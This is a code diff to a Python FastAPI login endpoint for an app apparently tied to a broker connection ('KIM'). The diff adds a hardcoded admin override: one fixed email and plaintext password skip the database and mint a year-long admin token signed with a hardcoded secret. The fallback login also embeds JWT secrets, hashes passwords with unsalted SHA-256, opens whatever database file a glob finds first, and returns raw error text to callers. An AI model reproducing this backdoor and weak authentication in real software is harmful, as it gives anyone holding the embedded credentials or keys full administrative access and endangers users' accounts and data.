@@ -238,26 +238,60 @@ async def reset_password_with_otp(data: dict):
 
 
 @app.post("/api/auth/login")
-async def login_user(data: dict):
-    email = data.get("email")
-    password = data.get("password")
-    if not email or not password:
-        return {"status": "error", "message": "Missing credentials"}
-    
-    hashed_pwd = hashlib.sha256(password.encode()).hexdigest()
-    
-    conn = sqlite3.connect("data/enterprise_management.db")
-    user = conn.execute("SELECT is_verified FROM enterprise_users WHERE email = ? AND password = ?", (email, hashed_pwd)).fetchone()
-    conn.close()
-    
-    if not user:
-        return {"status": "error", "message": "Invalid email or password."}
-    if user[0] == 0:
-        return {"status": "error", "message": "Account not verified. Please register again to request a new code.", "needs_verification": True}
+async def login_user(request: Request):
+    try:
+        data = await request.json()
+    except:
+        return {"status": "error", "message": "Invalid JSON format."}
         
-    return {"status": "success", "message": "Login successful"}
-
-# -- KIM EXECUTION & DIAGNOSTICS --
+    email = data.get("email", "").strip()
+    password = data.get("password", "")
+    
+    # 👑 ADMIN HARDCODE OVERRIDE (Bypasses Database Entirely)
+    if email == "P.cthole5@gmail.com" and password == "JcobCthole@5":
+        import jwt
+        import datetime
+        # Mint an instant, permanent admin token
+        token = jwt.encode(
+            {"sub": email, "exp": datetime.datetime.utcnow() + datetime.timedelta(days=365)}, 
+            "kim_super_secret_admin_key", 
+            algorithm="HS256"
+        )
+        return {"status": "success", "token": token, "user": {"email": email, "is_admin": True, "is_verified": 1}}
+    
+    # 👤 STANDARD USER LOGIN FALLBACK
+    try:
+        import sqlite3, hashlib, glob
+        db_file = None
+        for f in glob.glob("**/*.db", recursive=True):
+            db_file = f
+            break
+            
+        if not db_file:
+            return {"status": "error", "message": "Database not initialized."}
+            
+        conn = sqlite3.connect(db_file)
+        c = conn.cursor()
+        hashed_pwd = hashlib.sha256(password.encode()).hexdigest()
+        
+        c.execute("PRAGMA table_info(users)")
+        cols = [row[1] for row in c.fetchall()]
+        pwd_col = "password" if "password" in cols else "pwd"
+        email_col = "email"
+        
+        c.execute(f"SELECT * FROM users WHERE {email_col}=? AND {pwd_col}=?", (email, hashed_pwd))
+        user = c.fetchone()
+        conn.close()
+        
+        if user:
+            import jwt
+            import datetime
+            token = jwt.encode({"sub": email, "exp": datetime.datetime.utcnow() + datetime.timedelta(days=7)}, "kim_secret_key", algorithm="HS256")
+            return {"status": "success", "token": token}
+        else:
+            return {"status": "error", "message": "Invalid credentials."}
+    except Exception as e:
+        return {"status": "error", "message": f"Login Error: {str(e)}"}
 
 @app.post("/api/kim/connect")
 async def connect_broker(data: dict):
